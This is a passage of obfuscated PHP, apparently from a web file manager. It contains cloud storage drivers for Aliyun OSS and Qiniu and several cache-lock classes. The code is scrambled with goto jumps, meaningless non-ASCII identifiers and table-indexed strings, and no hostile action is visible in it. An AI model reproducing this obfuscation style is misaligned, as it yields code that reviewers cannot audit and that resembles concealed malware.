think_exception($dİâ±§Çİ¬->getMessage()); return !1; } } private function trafficLimit($AÃÇØÏˆì’, $Däæ÷£‡ØÌ = array()) { goto F²¬…†É; DùŸ±Ìİ£Õ: if (!$DÇ‰îğÜ) { return $Däæ÷£‡ØÌ; } $DÇ‰îğÜ = $DÇ‰îğÜ < 819200 ? 819200 : ($DÇ‰îğÜ > 838860800 ? 838860800 : $DÇ‰îğÜ); $Däæ÷£‡ØÌ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($DÇ‰îğÜ); goto dÑ‘¤‹È”; dÑ‘¤‹È”: return $Däæ÷£‡ØÌ; goto bƒº•àÊÛ; F²¬…†É: $cÒù¢À¨ÓÆ =& $_SERVER[Â€Á›¨õ]; if ($AÃÇØÏˆì’ == $cÒù¢À¨ÓÆ[1261] && $this->isUploadServer() || $AÃÇØÏˆì’ == $cÒù¢À¨ÓÆ[108] && $this->isFileOutServer()) { return $Däæ÷£‡ØÌ; } $DÇ‰îğÜ = floatval($GLOBALS[$cÒù¢À¨ÓÆ[6]][$cÒù¢À¨ÓÆ[87]][$cÒù¢À¨ÓÆ[106]][$AÃÇØÏˆì’]) * 1024 * 1024 * 8; goto DùŸ±Ìİ£Õ; bƒº•àÊÛ: } public function link($AïƒŠ¦½†Æ, $cÚ²íÙ¦ = array()) { $Bè í×‘ù =& $_SERVER[Â€Á›¨õ]; if (!$this->exist($AïƒŠ¦½†Æ) || $this->isFolder($AïƒŠ¦½†Æ)) { return !1; } try { $cÚ²íÙ¦ = $this->trafficLimit($Bè í×‘ù[108], $cÚ²íÙ¦); $e¨¼”’ÉÂ = $this->client->signUrl($this->bucket, $this->pathEncode($AïƒŠ¦½†Æ), 3600 * 12, $Bè í×‘ù[226], $cÚ²íÙ¦); return $this->getCdnLink($e¨¼”’ÉÂ); } catch (OSS\Core\OssException $eô¯£šï‘) { return !1; } } public function fileOut($DãÅŞ¡õÂ, $Eœ¦ÊÊÚª¸ = false, $EÑöÎßèª† = false, $cÚ¯–æ¯¤“ = '') { goto fÖºÊÚ¤…Ç; Dã”°ˆ¦‰: $Eœ¦ÊÊÚª¸ = $Eœ¦ÊÊÚª¸ ? $bÌÈøĞÏŞ[212] : $bÌÈøĞÏŞ[213]; $EåŞ„Ø‰¸ = array(OSS\OssClient::OSS_SUB_RESOURCE => $bÌÈøĞÏŞ[1272] . rawurlencode("{$Eœ¦ÊÊÚª¸}\73\x66\x69\x6c\x65\x6e\x61\x6d\145\x3d{$EÑöÎßèª†}")); $EåŞ„Ø‰¸[OSS\OssClient::OSS_SUB_RESOURCE] .= $bÌÈøĞÏŞ[1273] . rawurlencode($aÎ±¸˜Ó¶Ó); goto E¯Ş‚Ğ„•; E—¢ÉƒÙÀ: $EÑöÎßèª† = rawurlencode($EÑöÎßèª†); $aÎ±¸˜Ó¶Ó = get_file_mime(get_path_ext($EÑöÎßèª†)); if ($aÎ±¸˜Ó¶Ó == $bÌÈøĞÏŞ[211]) { return parent::fileOut($DãÅŞ¡õÂ, $Eœ¦ÊÊÚª¸, $EÑöÎßèª†, $cÚ¯–æ¯¤“); } goto Dã”°ˆ¦‰; fÖºÊÚ¤…Ç: $bÌÈøĞÏŞ =& $_SERVER[Â€Á›¨õ]; if ($this->isFileOutServer()) { return $this->fileOutServer($DãÅŞ¡õÂ, $Eœ¦ÊÊÚª¸, $EÑöÎßèª†, $cÚ¯–æ¯¤“); } if (!$EÑöÎßèª†) { $EÑöÎßèª† = $this->pathThis($DãÅŞ¡õÂ); } goto E—¢ÉƒÙÀ; E¯Ş‚Ğ„•: $e»åçÆ›ó = $this->link($DãÅŞ¡õÂ, $EåŞ„Ø‰¸); $this->fileOutLink($e»åçÆ›ó); goto c°ø¼Õ; c°ø¼Õ: } public function fileOutServer($f™§Í¦²î³, $AÇç†¥¼ìÔ = false, $eâ¡×Áóƒ = false, $d’»©Ö‰çŞ = '') { parent::fileOut($f™§Í¦²î³, $AÇç†¥¼ìÔ, $eâ¡×Áóƒ, $d’»©Ö‰çŞ); } public function fileOutImage($aäÄË»Š ‡, $a¦Øº´¿ = 250) { $Aª‚ŠÖ±† = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Â€Á›¨õ][1274] . $a¦Øº´¿); $Eƒğ¢…†§ = $this->link($aäÄË»Š ‡, $Aª‚ŠÖ±†); $this->fileOutLink($Eƒğ¢…†§); } public function fileOutImageServer($eº•‡Ëìâ, $cîÒÒÖõÖ» = 250) { parent::fileOutImage($eº•‡Ëìâ, $cîÒÒÖõÖ»); } public function fileOutLink($aø²ÇŒÁ„ù) { $bĞÈÏÓó·¦ =& $_SERVER[Â€Á›¨õ]; if (!$this->isCdnHost() && substr($aø²ÇŒÁ„ù, 0, 7) == $bĞÈÏÓó·¦[1176]) { $aø²ÇŒÁ„ù = $bĞÈÏÓó·¦[1177] . substr($aø²ÇŒÁ„ù, 7); } header($bĞÈÏÓó·¦[158] . $aø²ÇŒÁ„ù); die; } public function hashMd5($bº–İÙÒäˆ, $FĞÛ¢á¨Ú÷ = '') { $eœÅêï†ë =& $_SERVER[Â€Á›¨õ]; $d©–¼”ªŸ = $this->_objectMeta($bº–İÙÒäˆ); if (!$d©–¼”ªŸ) { return $eœÅêï†ë[33]; } if (!isset($d©–¼”ªŸ[$eœÅêï†ë[1250]]) && !empty($FĞÛ¢á¨Ú÷)) { $D³œ‹¨–¬ = $this->updateObjMeta($bº–İÙÒäˆ, array($eœÅêï†ë[1250] => $FĞÛ¢á¨Ú÷)); $d©–¼”ªŸ[$eœÅêï†ë[1250]] = $D³œ‹¨–¬ ? $FĞÛ¢á¨Ú÷ : $eœÅêï†ë[33]; } return isset($d©–¼”ªŸ[$eœÅêï†ë[1250]]) ? strtolower($d©–¼”ªŸ[$eœÅêï†ë[1250]]) : $eœÅêï†ë[33]; } public function size($Cù”çæÉ) { $FğÕ·ğêİ¶ = $this->objectMeta($Cù”çæÉ); return $FğÕ·ğêİ¶ ? $FğÕ·ğêİ¶[$_SERVER[Â€Á›¨õ][77]] : 0; } public function info($CÏ³Ø„Üî) { if ($this->isFolder($CÏ³Ø„Üî)) { return $this->folderInfo($CÏ³Ø„Üî); } else { if ($this->isFile($CÏ³Ø„Üî)) { return $this->fileInfo($CÏ³Ø„Üî); } } return !1; } public function exist($B™‚ˆ‹°‹í) { return $this->isFile($B™‚ˆ‹°‹í) || $this->isFolder($B™‚ˆ‹°‹í); } public function isFile($bÇ¯å’İÔ) { return !$this->isFolder($bÇ¯å’İÔ) && $this->objectMeta($bÇ¯å’İÔ); } public function isFolder($BöÍ³—Š¸­) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][197], $BöÍ³—Š¸­); } protected function objectMeta($b‡»øÅ®ÂË) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][198], $b‡»øÅ®ÂË); } protected function _objectMeta($dŸˆ›«õÜé) { $eŠÄø•ƒÏ‡ =& $_SERVER[Â€Á›¨õ]; try { $eğø‚öñô = $this->client->getObjectMeta($this->bucket, $this->pathEncode($dŸˆ›«õÜé)); } catch (OSS\Core\OssException $aÉåÄÜ‘Å„) { $eğø‚öñô = !1; } if ($eğø‚öñô) { $eğø‚öñô[$eŠÄø•ƒÏ‡[77]] = intval($eğø‚öñô[$eŠÄø•ƒÏ‡[1248]]); } return $eğø‚öñô; } protected function _isFolder($e‚¿—äìòÑ) { $Dô¶Ç•Á±­ =& $_SERVER[Â€Á›¨õ]; if ($e‚¿—äìòÑ == $Dô¶Ç•Á±­[33] || $e‚¿—äìòÑ == $Dô¶Ç•Á±­[8]) { return !0; } $a­ÕÍùëæ = array($Dô¶Ç•Á±­[1244] => $Dô¶Ç•Á±­[8], $Dô¶Ç•Á±­[1245] => rtrim($e‚¿—äìòÑ, $Dô¶Ç•Á±­[8]) . $Dô¶Ç•Á±­[8], $Dô¶Ç•Á±­[1246] => 1, $Dô¶Ç•Á±­[1247] => $Dô¶Ç•Á±­[33]); $Eİ‚šŒ½•” = $this->client->listObjects($this->bucket, $a­ÕÍùëæ); if ($Eİ‚šŒ½•”->getObjectList() || $Eİ‚šŒ½•”->getPrefixList()) { return !0; } return !1; } } goto B’â¹Û÷£Ã; d²Ã­“À: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto EäÖƒÓ›õ; D›ô‹Øïˆ: self::$timeout = $c¡„»Ò…[$bàÒœ‚‹°[782]] ? $c¡„»Ò…[$bàÒœ‚‹°[782]] : 10; $EÏÙ“ç³ó = _get($GLOBALS[$bàÒœ‚‹°[6]], $bàÒœ‚‹°[783]); $Fƒ‰ù“¯™„ = $c¡„»Ò…[$bàÒœ‚‹°[769]] ? $c¡„»Ò…[$bàÒœ‚‹°[769]] : $bàÒœ‚‹°[173]; goto BšÀ„Š§ô…; EäÖƒÓ›õ: $bàÒœ‚‹° =& $_SERVER[Â€Á›¨õ]; if (self::$handle) { return self::$handle; } $c¡„»Ò… = $GLOBALS[$bàÒœ‚‹°[6]][$bàÒœ‚‹°[345]]; goto D›ô‹Øïˆ; BšÀ„Š§ô…: if ($Fƒ‰ù“¯™„ == $bàÒœ‚‹°[17] && $EÏÙ“ç³ó == $bàÒœ‚‹°[9]) { $Fƒ‰ù“¯™„ = $bàÒœ‚‹°[173]; } switch ($Fƒ‰ù“¯™„) { case $bàÒœ‚‹°[772]: self::$handle = new CacheLockRedis(); break; case $bàÒœ‚‹°[773]: self::$handle = new CacheLockMemcached(); break; case $bàÒœ‚‹°[17]: self::$handle = new CacheLockDatabase(); break; case $bàÒœ‚‹°[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto EëºÅÕÌ§; EëºÅÕÌ§: } private static function key($b»´ŠØÙô’) { return $_SERVER[Â€Á›¨õ][784] . Cache::key($b»´ŠØÙô’); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($AÂßÊ²œ = '') { self::$errorMsg = $AÂßÊ²œ; } public static function lockGlobal($B§ï¤‹ë‹Œ, $f½á‹˜ó) { return self::lock($B§ï¤‹ë‹Œ, $f½á‹˜ó, !0); } public static function lock($Cî÷¼’­Ë, $Cğò«Ú‰äÈ = false, $D¹îÍ×ˆÒå = false) { goto B‚ÀÈ²¤äÛ; aØŠÎ´‘¿Ø: $Cğò«Ú‰äÈ = $Cğò«Ú‰äÈ ? $Cğò«Ú‰äÈ : self::$timeout; $b§°‘©¡…¶ = $E“«ÊÕÀÄè->lock($a¹Œã«é‹ö, $Cğò«Ú‰äÈ); if (!$b§°‘©¡…¶) { $CÖÒ©–ˆ¤Á = "\154\157\x63\153\40\145\162\162\x6f\162\x3b\153\x65\171\x3d{$Cî÷¼’­Ë}\x3b\164\x69\x6d\145\75{$Cğò«Ú‰äÈ}\x3b" . self::$errorMsg . $eÛ°Õ¸¦Ô¯[67] . get_caller_msg(); $aƒíŒ¾Â = LNG($eÛ°Õ¸¦Ô¯[785]) . "\50{$Cğò«Ú‰äÈ}\163\x29\x2e" . LNG($eÛ°Õ¸¦Ô¯[786]); $aƒíŒ¾Â .= $eÛ°Õ¸¦Ô¯[787]; if (is_string(self::$errorMsg) && self::$errorMsg) { $aƒíŒ¾Â = $aƒíŒ¾Â . $eÛ°Õ¸¦Ô¯[788] . self::$errorMsg; } write_log($CÖÒ©–ˆ¤Á, $eÛ°Õ¸¦Ô¯[789]); show_json($aƒíŒ¾Â, !1); } goto C¤­¿†¡ö·; C¤­¿†¡ö·: if (!$D¹îÍ×ˆÒå) { self::$lockItem[$a¹Œã«é‹ö] = !0; } return $b§°‘©¡…¶; goto D¶›Ë¦µŸ; B‚ÀÈ²¤äÛ: $eÛ°Õ¸¦Ô¯ =& $_SERVER[Â€Á›¨õ]; $E“«ÊÕÀÄè = self::init(); $a¹Œã«é‹ö = self::key($Cî÷¼’­Ë); goto aØŠÎ´‘¿Ø; D¶›Ë¦µŸ: } public static function lockGet($c«ğ¾»Ãõ) { $c“°æ¾¨Ä = self::key($c«ğ¾»Ãõ); if (self::$lockItem[$c“°æ¾¨Ä]) { return self::$lockItem[$c“°æ¾¨Ä]; } return self::init()->lockGet($c“°æ¾¨Ä); } public static function unlock($Dƒ¨®ïå‰Š) { $FÏ¸†ŒÆ¤Ê = self::key($Dƒ¨®ïå‰Š); self::$lockItem[$FÏ¸†ŒÆ¤Ê] = null; return self::init()->unlock($FÏ¸†ŒÆ¤Ê); } public static function unlockRuntime() { $f§×Ö¸½“ø =& $_SERVER[Â€Á›¨õ]; $fŒ™¸ÆáÊ = self::init(); $BË²ŞÅ“Ó = !1; foreach (self::$lockItem as $F•ó¬àíº’ => $ešÀ¹äğß) { if (!$ešÀ¹äğß) { continue; } $fŒ™¸ÆáÊ->unlock($F•ó¬àíº’); if (!$BË²ŞÅ“Ó) { $BË²ŞÅ“Ó = !0; write_log($f§×Ö¸½“ø[790] . $F•ó¬àíº’ . $f§×Ö¸½“ø[67] . get_caller_msg(), $f§×Ö¸½“ø[789]); continue; } write_log($f§×Ö¸½“ø[790] . $F•ó¬àíº’, $f§×Ö¸½“ø[789]); } self::fileUnlockAll(); } public static function fileLock($CÊ¢£¦Ï™õ) { goto B»´…Ó—ŞÃ; A¨¿“‚êí: $a˜ÍŞªÉã = fopen(DATA_PATH . $CÊ¢£¦Ï™õ . $C†ÅõŸµ„¬[792], $C†ÅõŸµ„¬[793]); if (!$a˜ÍŞªÉã) { return !1; } $GLOBALS[$C†ÅõŸµ„¬[791]][$CÊ¢£¦Ï™õ] = $a˜ÍŞªÉã; goto b¶¸öµ©šÃ; B»´…Ó—ŞÃ: $C†ÅõŸµ„¬ =& $_SERVER[Â€Á›¨õ]; if (!$GLOBALS[$C†ÅõŸµ„¬[791]]) { $GLOBALS[$C†ÅõŸµ„¬[791]] = array(); } $GLOBALS[$C†ÅõŸµ„¬[791]][$CÊ¢£¦Ï™õ] = !1; goto A¨¿“‚êí; b¶¸öµ©šÃ: if (flock($a˜ÍŞªÉã, LOCK_EX)) { return !0; } self::unlock($CÊ¢£¦Ï™õ); show_json($C†ÅõŸµ„¬[794], !1); goto cÍ¯Æ»‰ôà; cÍ¯Æ»‰ôà: return !1; goto C•óÏß°‚Õ; C•óÏß°‚Õ: } public static function fileUnlock($Bö…âøä) { $dÕ‡Ñ»ëæ´ =& $_SERVER[Â€Á›¨õ]; $dõíµÅÁĞò = $GLOBALS[$dÕ‡Ñ»ëæ´[791]][$Bö…âøä]; if (!$dõíµÅÁĞò) { return; } $GLOBALS[$dÕ‡Ñ»ëæ´[791]][$Bö…âøä] = !1; flock($dõíµÅÁĞò, LOCK_UN); fclose($dõíµÅÁĞò); } public static function fileUnlockAll() { $EğßªğÛñ =& $_SERVER[Â€Á›¨õ]; if (!$GLOBALS[$EğßªğÛñ[791]]) { return; } foreach ($GLOBALS[$EğßªğÛñ[791]] as $aÕù§¤ß½ => $cë†æ•Š¸í) { if (!$cë†æ•Š¸í) { continue; } $GLOBALS[$EğßªğÛñ[791]][$aÕù§¤ß½] = !1; flock($cë†æ•Š¸í, LOCK_UN); fclose($cë†æ•Š¸í); } $GLOBALS[$EğßªğÛñ[791]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $AñÊ¶ŸàªÙ =& $_SERVER[Â€Á›¨õ]; $C§øëË…  = $GLOBALS[$AñÊ¶ŸàªÙ[6]][$AñÊ¶ŸàªÙ[345]]; self::$cachePath = $C§øëË… [$AñÊ¶ŸàªÙ[173]][$AñÊ¶ŸàªÙ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($añŞ´ù·å‹, $dœíÎÂèë = 0) { goto AÚñ„ä”à; AÚñ„ä”à: $dÏÁ©Ô½¦ª =& $_SERVER[Â€Á›¨õ]; $fÛ÷¾÷¿Œ = microtime(!0); $f”İ¬ÅŒË = $fÛ÷¾÷¿Œ + $dœíÎÂèë + 0.0001; goto F¹Ô¡ÚçÖ¥; dÜ‚§Ÿ‘Øµ: $this->unlock($añŞ´ù·å‹); return !1; goto d˜ºªõªèÓ; F¹Ô¡ÚçÖ¥: $DÓ¿Úò¥â = rtrim(self::$cachePath, $dÏÁ©Ô½¦ª[8]) . $dÏÁ©Ô½¦ª[795] . md5($añŞ´ù·å‹) . $dÏÁ©Ô½¦ª[792]; if (file_exists($DÓ¿Úò¥â) && filemtime($DÓ¿Úò¥â) && filemtime($DÓ¿Úò¥â) < time() - 10) { @unlink($DÓ¿Úò¥â); } do { if (file_exists($DÓ¿Úò¥â)) { cacheLockWait(); continue; } $E“Îô‰øØï = fopen($DÓ¿Úò¥â, $dÏÁ©Ô½¦ª[796]); if (!$E“Îô‰øØï) { return !1; } $Fİî¾ˆåœ = flock($E“Îô‰øØï, LOCK_EX | LOCK_NB); self::$caches[$añŞ´ù·å‹] = array($dÏÁ©Ô½¦ª[797] => $E“Îô‰øØï, $dÏÁ©Ô½¦ª[173] => $DÓ¿Úò¥â); fwrite($E“Îô‰øØï, $f”İ¬ÅŒË); clearstatcache(); if ($E“Îô‰øØï && $Fİî¾ˆåœ) { return !0; } cacheLockWait(); } while (microtime(!0) < $f”İ¬ÅŒË); goto dÜ‚§Ÿ‘Øµ; d˜ºªõªèÓ: } public function lockGet($A¡Ş¹‹í) { $CØìÊˆ×Ÿ‡ =& $_SERVER[Â€Á›¨õ]; $FƒÌÕç× = rtrim(self::$cachePath, $CØìÊˆ×Ÿ‡[8]) . $CØìÊˆ×Ÿ‡[795] . md5($A¡Ş¹‹í) . $CØìÊˆ×Ÿ‡[792]; return file_exists($FƒÌÕç×); } public function unlock($cÄøÉõ»Šµ) { goto C¿°Ñ´‚ˆ; dË£Õß¤„‡: @flock($CÛ¬¦ÍÌÈ[$BË»ÜÕÆ²˜[797]], LOCK_UN); @fclose($CÛ¬¦ÍÌÈ[$BË»ÜÕÆ²˜[797]]); @unlink($CÛ¬¦ÍÌÈ[$BË»ÜÕÆ²˜[173]]); goto eÒøÌ²¯¹ñ; eÒøÌ²¯¹ñ: unset(self::$caches[$cÄøÉõ»Šµ]); goto fÁŒ—¤“×è; C¿°Ñ´‚ˆ: $BË»ÜÕÆ²˜ =& $_SERVER[Â€Á›¨õ]; $CÛ¬¦ÍÌÈ = self::$caches[$cÄøÉõ»Šµ]; if (!$CÛ¬¦ÍÌÈ) { return; } goto dË£Õß¤„‡; fÁŒ—¤“×è: } } goto B¸Œİ“ë; B’â¹Û÷£Ã: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($cÈØ·ß°¿) { parent::__construct(); require_once SDK_DIR . $_SERVER[Â€Á›¨õ][1275]; $this->_init($cÈØ·ß°¿); } public function _init($béßŠïšÁÇ) { goto A¨‘¤ôªï›; f êÍªİÚ£: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto C¢õŠÂ‚†Ã; aë²ìèŸ¼¶: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto f êÍªİÚ£; A¨‘¤ôªï›: $bÎÜ–Šà‚¤ =& $_SERVER[Â€Á›¨õ]; foreach ($béßŠïšÁÇ as $CÎ·Ù³‹Œ‡ => $A°ˆ–ÏÉÙª) { if (isset($this->{$CÎ·Ù³‹Œ‡})) { $this->{$CÎ·Ù³‹Œ‡} = $A°ˆ–ÏÉÙª; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($bÎÜ–Šà‚¤[1276] . LNG($bÎÜ–Šà‚¤[1235])); } goto aë²ìèŸ¼¶; C¢õŠÂ‚†Ã: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($aØ›³çŸ¥ª, $aöíì™–Ê… = '', $F…ˆ•âØ¦ = REPEAT_RENAME) { if ($this->setContent($aØ›³çŸ¥ª, $aöíì™–Ê…)) { return $this->getPathOuter($aØ›³çŸ¥ª); } return !1; } public function mkdir($cÃï®ÑÛ‘¨, $Dé”Æ´ô‰ = REPEAT_SKIP) { goto aƒ¢Åç“†ê; DöœŞÆ¤ Á: $cÃï®ÑÛ‘¨ = $eÈë¸©¶Êç . $BĞ‚âáÓ‚ö[8]; $b¢‚²ÆùÒÛ = get_path_this($eÈë¸©¶Êç); $c†“ö†ù ÷ = $cÃï®ÑÛ‘¨ . $b¢‚²ÆùÒÛ; goto CÛöŒÍÊç; CÛöŒÍÊç: if (!$this->mkfile($c†“ö†ù ÷)) { return !1; } if (!$this->moveFile($c†“ö†ù ÷, $cÃï®ÑÛ‘¨)) { $this->delFile($c†“ö†ù ÷); return !1; } return $this->getPathOuter($eÈë¸©¶Êç); goto dŒŒÏ¯î; aƒ¢Åç“†ê: $BĞ‚âáÓ‚ö =& $_SERVER[Â€Á›¨õ]; $eÈë¸©¶Êç = trim($cÃï®ÑÛ‘¨, $BĞ‚âáÓ‚ö[8]); if ($this->_isFolder($eÈë¸©¶Êç)) { return $this->getPathOuter($eÈë¸©¶Êç); } goto DöœŞÆ¤ Á; dŒŒÏ¯î: } public function copyFile($a”°¶ÀÂÃ, $D÷Õ¹ŒŞ ¦) { $aĞ³ßåñ•Ñ = $this->bucketManager->copy($this->bucket, $a”°¶ÀÂÃ, $this->bucket, $D÷Õ¹ŒŞ ¦, !0); return $aĞ³ßåñ•Ñ ? !1 : $this->getPathOuter($D÷Õ¹ŒŞ ¦); } public function moveFile($aŒƒÏä½Ç©, $e«¯›Ë‘¸Ø) { $E‘Ó÷Í†Ë = $this->bucketManager->move($this->bucket, $aŒƒÏä½Ç©, $this->bucket, $e«¯›Ë‘¸Ø, !0); return $E‘Ó÷Í†Ë ? !1 : $this->getPathOuter($e«¯›Ë‘¸Ø); } public function delFile($f‘œ±’³â) { if (!$this->exist($f‘œ±’³â)) { return !0; } $e‡æˆÎØŒŠ = $this->bucketManager->delete($this->bucket, $f‘œ±’³â); return $e‡æˆÎØŒŠ ? !1 : !0; } public function delFolder($E¤ŞèçƒãŠ) { goto F†¼´§Ë‰ƒ; dŒòŠŒ—ï˜: return $this->delByBatch($CÕÊô‰¤Ù[$FŠÏÊ“à„ê[74]]); goto d”•ì²œŠ; eÓ’Ö´ëŞ‚: $CÕÊô‰¤Ù = $this->fileList($E¤ŞèçƒãŠ); $this->listItemCache = !0; $CÏÅÌ¹ï™º = trim($E¤ŞèçƒãŠ, $FŠÏÊ“à„ê[8]) . $FŠÏÊ“à„ê[8]; goto F‰Ôâ™¬âİ; F†¼´§Ë‰ƒ: $FŠÏÊ“à„ê =& $_SERVER[Â€Á›¨õ]; if (!$this->exist($E¤ŞèçƒãŠ)) { return !0; } $this->listItemCache = !1; goto eÓ’Ö´ëŞ‚; F‰Ôâ™¬âİ: if (!empty($E¤ŞèçƒãŠ) && !in_array($CÏÅÌ¹ï™º, $CÕÊô‰¤Ù[$FŠÏÊ“à„ê[74]])) { $CÕÊô‰¤Ù[$FŠÏÊ“à„ê[74]][] = $CÏÅÌ¹ï™º; } $AË°Ôà¤Èæ = $this->delByBatch($CÕÊô‰¤Ù[$FŠÏÊ“à„ê[73]]); if (!$AË°Ôà¤Èæ) { return !1; } goto dŒòŠŒ—ï˜; d”•ì²œŠ: } private function delByBatch($EÙÙÀõŸÕÓ) { foreach (array_chunk($EÙÙÀõŸÕÓ, 1000) as $Eàà´Òœ…½) { $Ağøó°š„Ì = $this->bucketManager->buildBatchDelete($this->bucket, $Eàà´Òœ…½); list($bí™ßòĞ‰È, $cİ§‘¦ï§) = $this->bucketManager->batch($Ağøó°š„Ì); if ($cİ§‘¦ï§) { return !1; } } return !0; } public function rename($bÄ–Šœ…ñÆ, $Bª‡š™«æ) { return $this->renameObject($bÄ–Šœ…ñÆ, $Bª‡š™«æ); } public function fileInfo($c¤˜ÅºÓ£ˆ, $A¸ÍÍîÙ•Ü = false, $d•«›ÍÔå’ = array()) { goto c•£ğÚ†ÖÕ; B÷©ãÈÊ“à: if (isset($d•«›ÍÔå’[$B‹éà÷š[1278]])) { $Dš §ÇËè[$B‹éà÷š[83]] = substr($d•«›ÍÔå’[$B‹éà÷š[1278]] . $B‹éà÷š[33], 0, 10); } if (isset($d•«›ÍÔå’[$B‹éà÷š[1277]])) { $Dš §ÇËè[$B‹éà÷š[77]] = $d•«›ÍÔå’[$B‹éà÷š[1277]]; } return $Dš §ÇËè; goto f°Ë¿‰•ª; c•£ğÚ†ÖÕ: $B‹éà÷š =& $_SERVER[Â€Á›¨õ]; $Dš §ÇËè = array($B‹éà÷š[28] => $this->pathThis($c¤˜ÅºÓ£ˆ), $B‹éà÷š[75] => $this->getPathOuter($B‹éà÷š[8] . $c¤˜ÅºÓ£ˆ), $B‹éà÷š[29] => $B‹éà÷š[173], $B‹éà÷š[77] => isset($d•«›ÍÔå’[$B‹éà÷š[1277]]) ? $d•«›ÍÔå’[$B‹éà÷š[1277]] : 0, $B‹éà÷š[167] => $this->ext($c¤˜ÅºÓ£ˆ)); if ($A¸ÍÍîÙ•Ü) { return $Dš §ÇËè; } goto F£Ñ×®Á¿â; F£Ñ×®Á¿â: $Dš §ÇËè[$B‹éà÷š[192]] = $Dš §ÇËè[$B‹éà÷š[83]] = 0; $Dš §ÇËè[$B‹éà÷š[193]] = $Dš §ÇËè[$B‹éà÷š[194]] = !0; if (empty($d•«›ÍÔå’)) { $d•«›ÍÔå’ = $this->objectMeta($c¤˜ÅºÓ£ˆ); if (!$d•«›ÍÔå’) { return $Dš §ÇËè; } } goto B÷©ãÈÊ“à; f°Ë¿‰•ª: } public function folderInfo($a´çÌ¸, $b¢“Ş™£‰© = false) { goto Aé»‹¹…‘Ç; Aé»‹¹…‘Ç: $bğ©¯Š›‘ï =& $_SERVER[Â€Á›¨õ]; $aˆ¹Ÿæ†Ğ = array($bğ©¯Š›‘ï[28] => $this->pathThis($a´çÌ¸), $bğ©¯Š›‘ï[75] => $this->getPathOuter($bğ©¯Š›‘ï[8] . $a´çÌ¸), $bğ©¯Š›‘ï[29] => $bğ©¯Š›‘ï[76]); if ($b¢“Ş™£‰©) { return $aˆ¹Ÿæ†Ğ; } goto E«Ú è óİ; E«Ú è óİ: $aˆ¹Ÿæ†Ğ[$bğ©¯Š›‘ï[192]] = $aˆ¹Ÿæ†Ğ[$bğ©¯Š›‘ï[83]] = 0; $aˆ¹Ÿæ†Ğ[$bğ©¯Š›‘ï[193]] = $aˆ¹Ÿæ†Ğ[$bğ©¯Š›‘ï[194]] = !0; $a´çÌ¸ = rtrim($a´çÌ¸, $bğ©¯Š›‘ï[8]) . $bğ©¯Š›‘ï[8]; goto CØÓ›·Ê«; CØÓ›·Ê«: $d»‰öö’Î = $this->objectMeta($a´çÌ¸); if (isset($d»‰öö’Î[$bğ©¯Š›‘ï[1278]])) { $aˆ¹Ÿæ†Ğ[$bğ©¯Š›‘ï[83]] = substr($d»‰öö’Î[$bğ©¯Š›‘ï[1278]] . $bğ©¯Š›‘ï[33], 0, 10); } return $aˆ¹Ÿæ†Ğ; goto cßË¹‘ã¢ß; cßË¹‘ã¢ß: } public function listPath($DŸ‡¢„·½, $E‹£¬ùÕÀ± = false) { $E§ƒé¯Ò‘œ =& $_SERVER[Â€Á›¨õ]; $B…â¿´‰•Œ = $this->fileList($DŸ‡¢„·½, $E§ƒé¯Ò‘œ[8], !0); foreach ($B…â¿´‰•Œ[$E§ƒé¯Ò‘œ[74]] as $f”¥ÈÒğğ => $Aºæ¾Ç¼ã˜) { $B…â¿´‰•Œ[$E§ƒé¯Ò‘œ[74]][$f”¥ÈÒğğ] = $this->folderInfo($Aºæ¾Ç¼ã˜, $E‹£¬ùÕÀ±); } foreach ($B…â¿´‰•Œ[$E§ƒé¯Ò‘œ[73]] as $f”¥ÈÒğğ => $Aºæ¾Ç¼ã˜) { $B…â¿´‰•Œ[$E§ƒé¯Ò‘œ[73]][$f”¥ÈÒğğ] = $this->fileInfo($Aºæ¾Ç¼ã˜[$E§ƒé¯Ò‘œ[92]], $E‹£¬ùÕÀ±, $Aºæ¾Ç¼ã˜); } return $B…â¿´‰•Œ; } public function has($fä±†¸„ç£, $Dù¯„Ï¹×õ = false, $DòéÇÂ¯ó¶ = true) { goto F´ÛÅ§£¦Õ; F´ÛÅ§£¦Õ: $dÆæõÚÀ„£ =& $_SERVER[Â€Á›¨õ]; $fä±†¸„ç£ = trim($fä±†¸„ç£, $dÆæõÚÀ„£[8]); $eÊğÃ†‰øŞ = empty($fä±†¸„ç£) ? $dÆæõÚÀ„£[33] : $fä±†¸„ç£ . $dÆæõÚÀ„£[8]; goto e’Ş‡…„Ÿ; D†²‘íÉ‘„: $A·›é¼›¾¬ = $C¨Ãšíáó = 0; while (!0) { check_abort(); list($aÃŞ¥°áÖé, $d‹£åéÎôÔ) = $this->bucketManager->listFiles($this->bucket, $eÊğÃ†‰øŞ, $eŸÎ»‘ÓÃÒ, $BÍ›Àòñïƒ, $Fùªê®”µâ); if ($d‹£åéÎôÔ) { break; } $eŸÎ»‘ÓÃÒ = array_key_exists($dÆæõÚÀ„£[1247], $aÃŞ¥°áÖé) ? $eŸÎ»‘ÓÃÒ = $aÃŞ¥°áÖé[$dÆæõÚÀ„£[1279]] : $dÆæõÚÀ„£[33]; if ($Dù¯„Ï¹×õ) { if (!empty($aÃŞ¥°áÖé[$dÆæõÚÀ„£[1280]])) { $A·›é¼›¾¬ += count($aÃŞ¥°áÖé[$dÆæõÚÀ„£[1280]]); } if (!empty($aÃŞ¥°áÖé[$dÆæõÚÀ„£[1281]])) { 